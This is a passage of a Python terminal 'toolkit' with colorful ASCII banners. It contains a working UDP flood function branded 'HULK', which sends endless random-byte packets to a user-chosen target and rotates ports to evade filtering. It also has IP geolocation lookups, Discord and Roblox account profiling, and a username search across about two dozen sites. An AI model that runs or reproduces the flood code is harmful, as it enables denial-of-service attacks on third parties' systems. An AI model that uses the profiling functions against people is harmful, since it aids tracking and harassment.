        print(f"\033[38;5;196m🚨 DDoS ATTACK DETECTED!\033[0m")
        print(f"\033[38;5;196mAttack Confidence: {results['attack_confidence']}%\033[0m")
    else:
        print(f"\033[38;5;118m✅ No DDoS attacks detected\033[0m")
        print(f"\033[38;5;118mAttack Confidence: {results['attack_confidence']}%\033[0m")
    
    if results['suspicious_ips']:
        print(f"\n\033[38;5;214mSuspicious IPs detected:\033[0m")
        for ip in results['suspicious_ips']:
            print(f"  \033[38;5;214m• {ip}\033[0m")
    
    if results['packet_anomalies']:
        print(f"\n\033[38;5;208mPacket anomalies:\033[0m")
        for anomaly in results['packet_anomalies']:
            print(f"  \033[38;5;208m• {anomaly}\033[0m")
    
    if results['traffic_patterns']:
        print(f"\n\033[38;5;228mTraffic patterns:\033[0m")
        for pattern in results['traffic_patterns']:
            print(f"  \033[38;5;228m• {pattern}\033[0m")

def display_diagnostic_results(results):
    """Display network diagnostic results"""
    print("\033[38;5;218m" + "="*60 + "\033[0m")
    print("\033[38;5;210m            NETWORK DIAGNOSTICS\033[0m")
    print("\033[38;5;218m" + "="*60 + "\033[0m")
    
    health_colors = {
        'EXCELLENT': '\033[38;5;46m',
        'GOOD': '\033[38;5;118m',
        'FAIR': '\033[38;5;214m',
        'POOR': '\033[38;5;196m',
        'UNKNOWN': '\033[38;5;240m'
    }
    
    color = health_colors.get(results['network_health'], '\033[38;5;240m')
    
    print(f"\033[38;5;228mNetwork Health: {color}{results['network_health']}\033[0m")
    print(f"\033[38;5;228mAverage Latency: {results['latency']}\033[0m")
    print(f"\033[38;5;228mBandwidth Estimate: {results['bandwidth_estimate']}\033[0m")
    
    if results['issues_found']:
        print(f"\n\033[38;5;214mIssues Found:\033[0m")
        for issue in results['issues_found']:
            print(f"  \033[38;5;214m• {issue}\033[0m")
    
    if results['recommendations']:
        print(f"\n\033[38;5;118mRecommendations:\033[0m")
        for rec in results['recommendations']:
            print(f"  \033[38;5;118m• {rec}\033[0m")

# ============================ EXISTING FUNCTIONS ============================

def hulk_ddos_attack():
    """HULK DDoS Attack Tool - HTTP Unbearable Load King"""
    clear_screen()
    print("""\033[38;5;196m
                                            \033[38;5;196m███████╗\033[38;5;218m ██████╗ ██╗   ██╗██╗     
                                            \033[38;5;196m██╔════╝\033[38;5;218m██╔═══██╗██║   ██║██║     
                                            \033[38;5;196m███████╗\033[38;5;218m██║   ██║██║   ██║██║     
                                            \033[38;5;196m╚════██║\033[38;5;218m██║   ██║██║   ██║██║     
                                            \033[38;5;196m███████║\033[38;5;218m╚██████╔╝╚██████╔╝███████╗
                                            \033[38;5;196m╚══════╝\033[38;5;218m ╚═════╝  ╚══════╝

                                            HTTP UNBEARABLE LOAD KING
\033[0m
""")
    
    print("""\033[38;5;196m
    ************************************************
    *            _  _ _   _ _    _  __             *
    *           | || | | | | |  | |/ /             * 
    *           | __ | |_| | |__| ' <              *
    *           |_||_|\___/|____|_|\_\             *
    *                                              *
    *          HTTP Unbearable Load King           *
    *          Author: Sumalya Chatterjee          *
    *                                              *
    ************************************************
    ************************************************
    *                                              *    
    *  [!] Disclaimer :                            *
    *  1. Don't Use For Personal Revenges          *
    *  2. Author Is Not Responsible For Your Jobs  *
    *  3. Use for learning purposes                * 
    *  4. Does HULK suit in villain role, huh?     *
    ************************************************
\033[0m
""")
    
    # Get target information
    print("\033[38;5;228m[+] Give HULK A Target IP or URL:\033[0m")
    target = input("\n\033[38;5;196m> \033[0m").strip()
    
    if not target:
        print("\n\033[38;5;196mNo target specified.\033[0m")
        input("\033[38;5;228mPress G to go back...\033[0m")
        return
    
    print("\033[38;5;228m[+] Starting Port NO:\033[0m")
    try:
        port = int(input("\n\033[38;5;196m> \033[0m").strip())
    except:
        port = 80
    
    clear_screen()
    print("""\033[38;5;196m
    ************************************************
    *            _  _ _   _ _    _  __             *
    *           | || | | | | |  | |/ /             * 
    *           | __ | |_| | |__| ' <              *
    *           |_||_|\___/|____|_|\_\             *
    *                                              *
    *          HTTP Unbearable Load King           *
    *          Author: Sumalya Chatterjee          *
    *                                              *
    ************************************************
\033[0m
""")
    
    try:
        # Validate target
        socket.gethostbyname(target)
        print("\033[38;5;118m ✅ Valid Target Checked....\033[0m")
        print("\033[38;5;228m [+] Attack Screen Loading ....\033[0m")
    except:
        print("\033[38;5;196m ✘ Invalid target\033[0m")
        input("\033[38;5;228mPress G to go back...\033[0m")
        return
    
    # Setup socket and random bytes
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_data = random._urandom(1490)
    
    print(" ")
    print("\033[38;5;196m    That's my secret Cap, I am always angry\033[0m")
    print(" " )
    print(f"\033[38;5;196m [+] HULK is attacking server {target}\033[0m")
    print(" " )
    
    # Countdown
    for i in range(5, 0, -1):
        print(f"\033[38;5;196m [+] Starting attack in {i} seconds...\033[0m")
        time.sleep(1)
    
    print("\n\033[38;5;196m [!] ATTACK STARTED! Press Ctrl+C to stop\033[0m")
    print("\033[38;5;196m" + "="*80 + "\033[0m")
    
    sent = 0
    start_time = time.time()
    
    try:
        while True:
            try:
                sock.sendto(bytes_data, (target, port))
                sent += 1
                current_time = time.time() - start_time
                print(f"\033[38;5;196m [+] Sent {sent} packets to {target} through port:{port} | Time: {current_time:.1f}s\033[0m", end='\r')
                
                # Rotate ports to avoid simple filtering
                port += 1
                if port > 65534:
                    port = 1
                    
            except Exception as e:
                print(f"\n\033[38;5;214m [!] Error: {e}\033[0m")
                break
                
    except KeyboardInterrupt:
        print("\n\n\033[38;5;228m [-] Ctrl+C Detected.........Exiting\033[0m")
        print("\033[38;5;228m [-] DDOS ATTACK STOPPED\033[0m")
    
    finally:
        try:
            sock.close()
        except:
            pass
        print(f"\n\033[38;5;228m [-] Total packets sent: {sent}\033[0m")
        print("\033[38;5;228m [-] Attack duration: {:.1f} seconds\033[0m".format(time.time() - start_time))
        print("\033[38;5;228m [-] Dr. Banner is tired...\033[0m")
    
    input("\n\033[38;5;228mPress G to go back...\033[0m")

def get_my_ip():
    """Get and display the user's own IP address"""
    clear_screen()
    print("""\033[38;5;218m
                                            \033[38;5;210m███████╗\033[38;5;218m ██████╗ ██╗   ██╗██╗     
                                            \033[38;5;210m██╔════╝\033[38;5;218m██╔═══██╗██║   ██║██║     
                                            \033[38;5;210m███████╗\033[38;5;218m██║   ██║██║   ██║██║     
                                            \033[38;5;210m╚════██║\033[38;5;218m██║   ██║██║   ██║██║     
                                            \033[38;5;210m███████║\033[38;5;218m╚██████╔╝╚██████╔╝███████╗
                                            \033[38;5;210m╚══════╝\033[38;5;218m ╚═════╝  ╚══════╝

                                                   MY IP ADDRESS
\033[0m
""")
    
    print("\033[38;5;228mFetching your IP address...\033[0m")
    print("\033[38;5;228mThis may take a few seconds...\033[0m\n")
    
    try:
        # Try multiple IP lookup services
        services = [
            "https://api.ipify.org?format=json",
            "https://httpbin.org/ip",
            "https://ipinfo.io/json"
        ]
        
        my_ip = None
        for service in services:
            try:
                response = requests.get(service, timeout=10)
                if response.status_code == 200:
                    data = response.json()
                    if service == "https://api.ipify.org?format=json":
                        my_ip = data.get('ip')
                    elif service == "https://httpbin.org/ip":
                        my_ip = data.get('origin')
                    elif service == "https://ipinfo.io/json":
                        my_ip = data.get('ip')
                    
                    if my_ip:
                        break
            except:
                continue
        
        if my_ip:
            print("\033[38;5;218m" + "="*80 + "\033[0m")
            print("\033[38;5;210m                    YOUR IP ADDRESS\033[0m")
            print("\033[38;5;218m" + "="*80 + "\033[0m")
            print(f"\033[38;5;228mIP Address: \033[38;5;218m{my_ip}\033[0m")
            print("\033[38;5;218m" + "="*80 + "\033[0m")
            
            # Option to ping own IP
            print(f"\n\033[38;5;228mWould you like to ping your own IP address? (Y/N)\033[0m")
            choice = input("\n\033[38;5;218m> \033[0m").strip().upper()
            if choice == 'Y':
                # Simple ping implementation
                try:
                    response = os.system(f"ping -n 4 {my_ip}" if os.name == 'nt' else f"ping -c 4 {my_ip}")
                except:
                    pass
        else:
            print("\033[38;5;196mFailed to retrieve your IP address.\033[0m")
            
    except Exception as e:
        print(f"\n\033[38;5;196mError: {e}\033[0m")
    
    input("\n\033[38;5;228mPress G to go back...\033[0m")

def get_ip_info():
    while True:
        clear_screen()
        print("""\033[38;5;218m
                                            \033[38;5;210m███████╗\033[38;5;218m ██████╗ ██╗   ██╗██╗     
                                            \033[38;5;210m██╔════╝\033[38;5;218m██╔═══██╗██║   ██║██║     
                                            \033[38;5;210m███████╗\033[38;5;218m██║   ██║██║   ██║██║     
                                            \033[38;5;210m╚════██║\033[38;5;218m██║   ██║██║   ██║██║     
                                            \033[38;5;210m███████║\033[38;5;218m╚██████╔╝╚██████╔╝███████╗
                                            \033[38;5;210m╚══════╝\033[38;5;218m ╚═════╝  ╚══════╝

                                                  IP INFORMATION LOOKUP
\033[0m
""")
        
        print("\033[38;5;228mEnter IP address or type 'G' to go back to main menu\033[0m")
        ip_address = input("\n\033[38;5;218m> \033[0m").strip()
        
        if ip_address.upper() == 'G':
            return
        
        if not ip_address:
            print("\n\033[38;5;196mNo IP address entered.\033[0m")
            input("\033[38;5;228mPress G to go back...\033[0m")
            continue
        
        if not is_valid_ip(ip_address):
            print("\n\033[38;5;196mInvalid IP address format.\033[0m")
            input("\033[38;5;228mPress G to go back...\033[0m")
            continue
        
        print(f"\n\033[38;5;228mFetching information for IP: {ip_address}\033[0m")
        print("\033[38;5;228mThis may take a few seconds...\033[0m\n")
        
        try:
            ip_info = fetch_ip_info(ip_address)
            if ip_info:
                display_ip_info(ip_info, ip_address)
            else:
                print("\033[38;5;196mFailed to retrieve IP information.\033[0m")
        except Exception as e:
            print(f"\n\033[38;5;196mError: {e}\033[0m")
        
        choice = input("\n\033[38;5;228mPress G to go back...\033[0m").strip()
        if choice.upper() == 'G':
            return

def is_valid_ip(ip):
    import re
    ipv4_pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    ipv6_pattern = r'^([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}$'
    
    if re.match(ipv4_pattern, ip):
        parts = ip.split('.')
        for part in parts:
            if not 0 <= int(part) <= 255:
                return False
        return True
    elif re.match(ipv6_pattern, ip):
        return True
    return False

def fetch_ip_info(ip_address):
    apis = [
        f"http://ip-api.com/json/{ip_address}",
        f"https://ipinfo.io/{ip_address}/json",
    ]
    
    for api_url in apis:
        try:
            response = requests.get(api_url, timeout=10)
            if response.status_code == 200:
                data = response.json()
                if 'status' in data and data['status'] == 'success':
                    return parse_ipapi_data(data)
                elif 'ip' in data:
                    return parse_ipinfo_data(data)
            time.sleep(1)
        except:
            continue
    return None

def parse_ipapi_data(data):
    return {
        'ip': data.get('query', 'N/A'),
        'country': data.get('country', 'N/A'),
        'country_code': data.get('countryCode', 'N/A'),
        'region': data.get('regionName', 'N/A'),
        'city': data.get('city', 'N/A'),
        'zip': data.get('zip', 'N/A'),
        'lat': data.get('lat', 'N/A'),
        'lon': data.get('lon', 'N/A'),
        'timezone': data.get('timezone', 'N/A'),
        'isp': data.get('isp', 'N/A'),
        'org': data.get('org', 'N/A'),
        'as': data.get('as', 'N/A'),
    }

def parse_ipinfo_data(data):
    loc = data.get('loc', '').split(',')
    lat = loc[0] if len(loc) > 0 else 'N/A'
    lon = loc[1] if len(loc) > 1 else 'N/A'
    
    return {
        'ip': data.get('ip', 'N/A'),
        'country': data.get('country', 'N/A'),
        'region': data.get('region', 'N/A'),
        'city': data.get('city', 'N/A'),
        'zip': data.get('postal', 'N/A'),
        'lat': lat,
        'lon': lon,
        'timezone': data.get('timezone', 'N/A'),
        'isp': data.get('org', 'N/A'),
        'org': data.get('org', 'N/A'),
    }

def display_ip_info(ip_info, ip_address):
    print("\033[38;5;218m" + "="*80 + "\033[0m")
    print("\033[38;5;210m                    IP ADDRESS INFORMATION\033[0m")
    print("\033[38;5;218m" + "="*80 + "\033[0m")
    
    print(f"\033[38;5;228mIP Address: \033[38;5;218m{ip_info.get('ip', 'N/A')}\033[0m")
    print(f"\033[38;5;228mCountry: \033[38;5;218m{ip_info.get('country', 'N/A')}\033[0m")
    print(f"\033[38;5;228mRegion: \033[38;5;218m{ip_info.get('region', 'N/A')}\033[0m")
    print(f"\033[38;5;228mCity: \033[38;5;218m{ip_info.get('city', 'N/A')}\033[0m")
    print(f"\033[38;5;228mZIP Code: \033[38;5;218m{ip_info.get('zip', 'N/A')}\033[0m")
    print(f"\033[38;5;228mLatitude: \033[38;5;218m{ip_info.get('lat', 'N/A')}\033[0m")
    print(f"\033[38;5;228mLongitude: \033[38;5;218m{ip_info.get('lon', 'N/A')}\033[0m")
    print(f"\033[38;5;228mTimezone: \033[38;5;218m{ip_info.get('timezone', 'N/A')}\033[0m")
    print(f"\033[38;5;228mISP: \033[38;5;218m{ip_info.get('isp', 'N/A')}\033[0m")
    print(f"\033[38;5;228mOrganization: \033[38;5;218m{ip_info.get('org', 'N/A')}\033[0m")
    
    print("\033[38;5;218m" + "="*80 + "\033[0m")
    
    lat = ip_info.get('lat')
    lon = ip_info.get('lon')
    if lat != 'N/A' and lon != 'N/A' and lat and lon:
        print(f"\n\033[38;5;228mApproximate Location: \033[38;5;218mhttps://maps.google.com/?q={lat},{lon}\033[0m")

def ip_generator():
    """
    IP Generator / Fetcher (IPv4).
    - Option 1: Fetch IPv4 from public services (returns the IPv4 those services see)
    - Option 2: Generate random IPv4 addresses like 80.80.80.80
    - Option 3: Do both
    """
    clear_screen()
    print("""\033[38;5;218m
                                            \033[38;5;210m███████╗\033[38;5;218m ██████╗ ██╗   ██╗██╗     
                                            \033[38;5;210m██╔════╝\033[38;5;218m██╔═══██╗██║   ██║██║     
                                            \033[38;5;210m███████╗\033[38;5;218m██║   ██║██║   ██║██║     
                                            \033[38;5;210m╚════██║\033[38;5;218m██║   ██║██║   ██║██║     
                                            \033[38;5;210m███████║\033[38;5;218m╚██████╔╝╚██████╔╝███████╗
                                            \033[38;5;210m╚══════╝\033[38;5;218m ╚═════╝  ╚══════╝

                                                IP GENERATOR (IPv4)
\033[0m
""")
    print("\033[38;5;228mOptions:\033[0m")
    print("  1) Fetch IPv4 address from public web services")
    print("  2) Generate random IPv4 addresses (e.g. 80.80.80.80)")
    print("  3) Do both (fetch + generate)")
    print("  G) Go back to main menu")

    choice = input("\n\033[38;5;218m> \033[0m").strip().lower()
    if not choice:
        return
    if choice == 'g':
        return

    # Helper: basic IPv4 validation
    def looks_like_ipv4(s):
        try:
            socket.inet_pton(socket.AF_INET, s)
            return True
        except Exception:
            # fallback simple check
            parts = s.split('.')
            if len(parts) != 4:
                return False
            try:
                return all(0 <= int(p) <= 255 for p in parts)
            except:
                return False

    def fetch_ipv4_from_services():
        services = [
            "https://api.ipify.org?format=json",
            "https://httpbin.org/ip",
            "https://ipinfo.io/json",
            "https://ifconfig.me/all.json",
            "https://ident.me/.json"
        ]
        found = set()
        for svc in services:
            try:
                resp = requests.get(svc, timeout=8)
                if resp.status_code != 200:
                    continue
                try:
                    data = resp.json()
                except ValueError:
                    # some endpoints may return plain text
                    text = resp.text.strip()
                    data = {'ip': text}
                # common fields
                for key in ['ip', 'origin', 'client_ip', 'address']:
                    if key in data:
                        val = data[key]
                        if isinstance(val, str) and looks_like_ipv4(val):
                            found.add(val)
                # quick scan in text
                if isinstance(resp.text, str):
                    tokens = resp.text.replace('"', ' ').replace("'", " ").split()
                    for t in tokens:
                        if '.' in t and looks_like_ipv4(t):
                            found.add(t)
            except Exception:
                continue
        return list(found)

    def generate_random_ipv4(count=5):
        generated = []
        for _ in range(count):
            # generate octets - avoid 0 and 255 as the first octet for more realistic public IPs, but it's optional
            a = random.randint(1, 254)
            b = random.randint(0, 255)
            c = random.randint(0, 255)
            d = random.randint(1, 254)
            ip = f"{a}.{b}.{c}.{d}"
            generated.append(ip)
        return generated

    results = []
    if choice in ['1', '3']:
        print("\n\033[38;5;228mFetching IPv4 from public services...\033[0m")
        fetched = fetch_ipv4_from_services()
        if fetched:
            print("\n\033[38;5;118mFound the following IPv4 addresses from services:\033[0m")
            for ip in fetched:
                print(f"  - {ip}")
            results.extend(fetched)
        else:
            print("\n\033[38;5;214mNo IPv4 addresses found from the services (they may have failed or returned private/internal addresses).\033[0m")

    if choice in ['2', '3']:
        try:
            n = 5
            if choice == '2':
                print("\n\033[38;5;228mHow many random IPv4 addresses would you like to generate? (default 5)\033[0m")
                try:
                    n_in = input("\n\033[38;5;218m> \033[0m").strip()
                    if n_in:
                        n = int(n_in)
                except:
                    n = 5
            print(f"\n\033[38;5;228mGenerating {n} random IPv4 addresses...\033[0m")
            generated = generate_random_ipv4(n)
            print("\n\033[38;5;210mRandom IPv4 addresses:\033[0m")
            for ip in generated:
                print(f"  - {ip}")
            results.extend(generated)
        except Exception as e:
            print(f"\n\033[38;5;196mError while generating IPv4 addresses: {e}\033[0m")

    if not results:
        print("\n\033[38;5;196mNo IPv4 addresses to display.\033[0m")

    print("\n\033[38;5;218m" + "="*60 + "\033[0m")
    print("\033[38;5;228mNote: Fetching from public services returns the IPv4 address those services see (often your machine's public IPv4). The generated addresses are synthetic for testing/education.\033[0m")

    input("\n\033[38;5;228mPress G to go back...\033[0m")

def advanced_alt_checker():
    """Advanced Alt Checker with comprehensive platform analysis"""
    while True:
        clear_screen()
        print("""\033[38;5;218m
                                            \033[38;5;210m███████╗\033[38;5;218m ██████╗ ██╗   ██╗██╗     
                                            \033[38;5;210m██╔════╝\033[38;5;218m██╔═══██╗██║   ██║██║     
                                            \033[38;5;210m███████╗\033[38;5;218m██║   ██║██║   ██║██║     
                                            \033[38;5;210m╚════██║\033[38;5;218m██║   ██║██║   ██║██║     
                                            \033[38;5;210m███████║\033[38;5;218m╚██████╔╝╚██████╔╝███████╗
                                            \033[38;5;210m╚══════╝\033[38;5;218m ╚═════╝  ╚══════╝

                                                ADVANCED ALT CHECKER
\033[0m
""")
        
        print("\033[38;5;228mSelect platform to analyze:\033[0m")
        print("  1) Discord Account Analysis")
        print("  2) Roblox Account Investigation") 
        print("  3) Cross-Platform Username Search")
        print("  4) Account Fingerprinting")
        print("  G) Go back to main menu")
        
        choice = input("\n\033[38;5;218m> \033[0m").strip().lower()
        
        if choice == 'g':
            return
        elif choice == '1':
            discord_analysis()
        elif choice == '2':
            roblox_analysis()
        elif choice == '3':
            cross_platform_search()
        elif choice == '4':
            account_fingerprinting()
        else:
            print("\n\033[38;5;196mInvalid selection. Please choose 1-4 or G.\033[0m")
            input("\033[38;5;228mPress G to go back...\033[0m")

def discord_analysis():
    """Advanced Discord account analysis"""
    clear_screen()
    print("""\033[38;5;218m
                                            \033[38;5;210m███████╗\033[38;5;218m ██████╗ ██╗   ██╗██╗     
                                            \033[38;5;210m██╔════╝\033[38;5;218m██╔═══██╗██║   ██║██║     
                                            \033[38;5;210m███████╗\033[38;5;218m██║   ██║██║   ██║██║     
                                            \033[38;5;210m╚════██║\033[38;5;218m██║   ██║██║   ██║██║     
                                            \033[38;5;210m███████║\033[38;5;218m╚██████╔╝╚██████╔╝███████╗
                                            \033[38;5;210m╚══════╝\033[38;5;218m ╚═════╝  ╚══════╝

                                                DISCORD ACCOUNT ANALYSIS
\033[0m
""")
    
    print("\033[38;5;228mEnter Discord User ID or mention (type 'G' to go back):\033[0m")
    user_input = input("\n\033[38;5;218m> \033[0m").strip()
    
    if user_input.upper() == 'G':
        return
    
    # Extract user ID
    user_id = extract_discord_id(user_input)
    if not user_id:
        print("\n\033[38;5;196mInvalid Discord ID format.\033[0m")
        input("\033[38;5;228mPress G to go back...\033[0m")
        return
    
    print(f"\n\033[38;5;228mAnalyzing Discord account: {user_id}\033[0m")
    print("\033[38;5;228mThis may take a moment...\033[0m\n")
    
    # Advanced Discord analysis
    try:
        # Account creation date estimation
        creation_timestamp = (int(user_id) >> 22) + 1420070400000
        creation_date = datetime.fromtimestamp(creation_timestamp / 1000)
        account_age = (datetime.now() - creation_date).days
        
        print("\033[38;5;218m" + "="*80 + "\033[0m")
        print("\033[38;5;210m                  DISCORD ACCOUNT ANALYSIS REPORT\033[0m")
        print("\033[38;5;218m" + "="*80 + "\033[0m")
        
        print(f"\033[38;5;228mUser ID: \033[38;5;218m{user_id}\033[0m")
        print(f"\033[38;5;228mEstimated Creation: \033[38;5;218m{creation_date.strftime('%Y-%m-%d %H:%M:%S')}\033[0m")
        print(f"\033[38;5;228mAccount Age: \033[38;5;218m{account_age} days\033[0m")
        
        # Account type analysis based on ID patterns
        if user_id.startswith('1') and len(user_id) == 17:
            print(f"\033[38;5;228mAccount Type: \033[38;5;218mEarly User Account\033[0m")
        elif user_id.startswith('7') or user_id.startswith('8'):
            print(f"\033[38;5;228mAccount Type: \033[38;5;218mModern User Account\033[0m")
        else:
            print(f"\033[38;5;228mAccount Type: \033[38;5;218mStandard User Account\033[0m")
        
        # Avatar analysis
        avatar_urls = [
            f"https://cdn.discordapp.com/avatars/{user_id}/a_.gif?size=1024",
            f"https://cdn.discordapp.com/avatars/{user_id}/a_.png?size=1024",
            f"https://cdn.discordapp.com/embed/avatars/0.png"
        ]
        
        print(f"\n\033[38;5;228mAvatar Analysis:\033[0m")
        for url in avatar_urls:
            try:
                response = requests.head(url, timeout=5)
                if response.status_code == 200:
                    if "embed/avatars" in url:
                        print(f"  \033[38;5;214m• Default avatar detected\033[0m")
                    elif ".gif" in url:
                        print(f"  \033[38;5;118m• Animated avatar available (Nitro user)\033[0m")
                    else:
                        print(f"  \033[38;5;118m• Custom avatar available\033[0m")
                    break
            except:
                continue
        
        # Banner analysis (Nitro feature)
        banner_url = f"https://cdn.discordapp.com/banners/{user_id}/a_.png?size=600"
        try:
            response = requests.head(banner_url, timeout=5)
            if response.status_code == 200:
                print(f"  \033[38;5;118m• Custom banner detected (Nitro user)\033[0m")
            else:
                print(f"  \033[38;5;214m• No custom banner (likely no Nitro)\033[0m")
        except:
            print(f"  \033[38;5;214m• Banner check failed\033[0m")
        
        print("\033[38;5;218m" + "="*80 + "\033[0m")
        
    except Exception as e:
        print(f"\n\033[38;5;196mAnalysis error: {e}\033[0m")
    
    input("\n\033[38;5;228mPress G to go back...\033[0m")

def roblox_analysis():
    """Advanced Roblox account analysis"""
    clear_screen()
    print("""\033[38;5;218m
                                            \033[38;5;210m███████╗\033[38;5;218m ██████╗ ██╗   ██╗██╗     
                                            \033[38;5;210m██╔════╝\033[38;5;218m██╔═══██╗██║   ██║██║     
                                            \033[38;5;210m███████╗\033[38;5;218m██║   ██║██║   ██║██║     
                                            \033[38;5;210m╚════██║\033[38;5;218m██║   ██║██║   ██║██║     
                                            \033[38;5;210m███████║\033[38;5;218m╚██████╔╝╚██████╔╝███████╗
                                            \033[38;5;210m╚══════╝\033[38;5;218m ╚═════╝  ╚══════╝

                                                ROBLOX ACCOUNT ANALYSIS
\033[0m
""")
    
    print("\033[38;5;228mEnter Roblox username or User ID (type 'G' to go back):\033[0m")
    user_input = input("\n\033[38;5;218m> \033[0m").strip()
    
    if user_input.upper() == 'G':
        return
    
    print(f"\n\033[38;5;228mAnalyzing Roblox account: {user_input}\033[0m")
    print("\033[38;5;228mThis may take a moment...\033[0m\n")
    
    try:
        # Resolve username to user ID if needed
        user_id = user_input
        if not user_input.isdigit():
            url = "https://users.roblox.com/v1/usernames/users"
            payload = {"usernames": [user_input]}
            response = requests.post(url, json=payload, timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get("data"):
                    user_id = str(data["data"][0]["id"])
                    username = data["data"][0]["name"]
                else:
                    print("\033[38;5;196mUser not found.\033[0m")
                    input("\033[38;5;228mPress G to go back...\033[0m")
                    return
            else:
                print("\033[38;5;196mFailed to resolve username.\033[0m")
                input("\033[38;5;228mPress G to go back...\033[0m")
                return
        else:
            # If user ID provided, get username
            url = f"https://users.roblox.com/v1/users/{user_id}"
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                data = response.json()
                username = data.get("name", "Unknown")
            else:
                username = "Unknown"
        
        # Get detailed user info
        user_url = f"https://users.roblox.com/v1/users/{user_id}"
        user_response = requests.get(user_url, timeout=10)
        user_data = user_response.json() if user_response.status_code == 200 else {}
        
        # Get friends count
        friends_url = f"https://friends.roblox.com/v1/users/{user_id}/friends/count"
        friends_response = requests.get(friends_url, timeout=10)
        friends_count = friends_response.json().get("count", 0) if friends_response.status_code == 200 else 0
        
        # Get followers count
        followers_url = f"https://friends.roblox.com/v1/users/{user_id}/followers/count"
        followers_response = requests.get(followers_url, timeout=10)
        followers_count = followers_response.json().get("count", 0) if followers_response.status_code == 200 else 0
        
        # Get following count
        following_url = f"https://friends.roblox.com/v1/users/{user_id}/followings/count"
        following_response = requests.get(following_url, timeout=10)
        following_count = following_response.json().get("count", 0) if following_response.status_code == 200 else 0
        
        print("\033[38;5;218m" + "="*80 + "\033[0m")
        print("\033[38;5;210m                  ROBLOX ACCOUNT ANALYSIS REPORT\033[0m")
        print("\033[38;5;218m" + "="*80 + "\033[0m")
        
        print(f"\033[38;5;228mUsername: \033[38;5;218m{username}\033[0m")
        print(f"\033[38;5;228mUser ID: \033[38;5;218m{user_id}\033[0m")
        print(f"\033[38;5;228mDisplay Name: \033[38;5;218m{user_data.get('displayName', 'N/A')}\033[0m")
        print(f"\033[38;5;228mAccount Created: \033[38;5;218m{user_data.get('created', 'N/A')}\033[0m")
        print(f"\033[38;5;228mDescription: \033[38;5;218m{user_data.get('description', 'N/A')}\033[0m")
        
        print(f"\n\033[38;5;228mSocial Metrics:\033[0m")
        print(f"  \033[38;5;218m• Friends: {friends_count}\033[0m")
        print(f"  \033[38;5;218m• Followers: {followers_count}\033[0m")
        print(f"  \033[38;5;218m• Following: {following_count}\033[0m")
        
        # Account age analysis
        if user_data.get('created'):
            created_date = datetime.fromisoformat(user_data['created'].replace('Z', '+00:00'))
            account_age = (datetime.now().astimezone() - created_date).days
            print(f"  \033[38;5;218m• Account Age: {account_age} days\033[0m")
            
            if account_age < 30:
                print(f"  \033[38;5;214m• Account Status: NEW (potential alt)\033[0m")
            elif account_age < 365:
                print(f"  \033[38;5;228m• Account Status: ESTABLISHED\033[0m")
            else:
                print(f"  \033[38;5;118m• Account Status: VETERAN\033[0m")
        
        print("\033[38;5;218m" + "="*80 + "\033[0m")
        
    except Exception as e:
        print(f"\n\033[38;5;196mAnalysis error: {e}\033[0m")
    
    input("\n\033[38;5;228mPress G to go back...\033[0m")

def cross_platform_search():
    """Cross-platform username search across multiple services"""
    clear_screen()
    print("""\033[38;5;218m
                                            \033[38;5;210m███████╗\033[38;5;218m ██████╗ ██╗   ██╗██╗     
                                            \033[38;5;210m██╔════╝\033[38;5;218m██╔═══██╗██║   ██║██║     
                                            \033[38;5;210m███████╗\033[38;5;218m██║   ██║██║   ██║██║     
                                            \033[38;5;210m╚════██║\033[38;5;218m██║   ██║██║   ██║██║     
                                            \033[38;5;210m███████║\033[38;5;218m╚██████╔╝╚██████╔╝███████╗
                                            \033[38;5;210m╚══════╝\033[38;5;218m ╚═════╝  ╚══════╝

                                            CROSS-PLATFORM USERNAME SEARCH
\033[0m
""")
    
    print("\033[38;5;228mEnter username to search across platforms (type 'G' to go back):\033[0m")
    username = input("\n\033[38;5;218m> \033[0m").strip()
    
    if username.upper() == 'G':
        return
    
    if not username:
        print("\n\033[38;5;196mNo username entered.\033[0m")
        input("\033[38;5;228mPress G to go back...\033[0m")
        return
    
    print(f"\n\033[38;5;228mSearching for username: {username}\033[0m")
    print("\033[38;5;228mThis may take several minutes...\033[0m\n")
    
    # Extended platform list for comprehensive search
    platforms = [
        # Gaming Platforms
        {"name": "Steam", "url": f"https://steamcommunity.com/id/{username}"},
        {"name": "Epic Games", "url": f"https://www.epicgames.com/account/users/{username}"},
        {"name": "Xbox", "url": f"https://xboxgamertag.com/search/{username}"},
        {"name": "PlayStation", "url": f"https://psnprofiles.com/{username}"},
        {"name": "Minecraft", "url": f"https://namemc.com/profile/{username}"},
        {"name": "Fortnite", "url": f"https://fortnitetracker.com/profile/all/{username}"},
        
        # Social Media
        {"name": "Instagram", "url": f"https://www.instagram.com/{username}"},
        {"name": "Twitter", "url": f"https://twitter.com/{username}"},
        {"name": "TikTok", "url": f"https://www.tiktok.com/@{username}"},
        {"name": "Facebook", "url": f"https://www.facebook.com/{username}"},
        {"name": "Reddit", "url": f"https://www.reddit.com/user/{username}"},
        {"name": "LinkedIn", "url": f"https://www.linkedin.com/in/{username}"},
        
        # Tech Platforms
        {"name": "GitHub", "url": f"https://github.com/{username}"},
        {"name": "GitLab", "url": f"https://gitlab.com/{username}"},
        {"name": "Stack Overflow", "url": f"https://stackoverflow.com/users/{username}"},
        
        # Creative Platforms
        {"name": "DeviantArt", "url": f"https://{username}.deviantart.com"},
        {"name": "ArtStation", "url": f"https://www.artstation.com/{username}"},
        {"name": "Behance", "url": f"https://www.behance.net/{username}"},
        
        # Other
        {"name": "Twitch", "url": f"https://www.twitch.tv/{username}"},
        {"name": "YouTube", "url": f"https://www.youtube.com/@{username}"},
        {"name": "Spotify", "url": f"https://open.spotify.com/user/{username}"},
        {"name": "Pinterest", "url": f"https://www.pinterest.com/{username}"},
        {"name": "Imgur", "url": f"https://imgur.com/user/{username}"},
    ]
    
    results = []
    
    def check_platform_thread(platform):
        try:
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            response = requests.get(platform["url"], headers=headers, timeout=8, allow_redirects=False)
            
            if response.status_code == 200:
                return platform["name"], "FOUND", platform["url"]
            elif response.status_code in [301, 302]:
                return platform["name"], "REDIRECT", platform["url"]
            else:
                return platform["name"], "NOT_FOUND", None
        except:
            return platform["name"], "ERROR", None
    
    # Check platforms with threading for faster results
    threads = []
    for platform in platforms:
        thread = threading.Thread(target=lambda p=platform: results.append(check_platform_thread(p)))
        threads.append(thread)
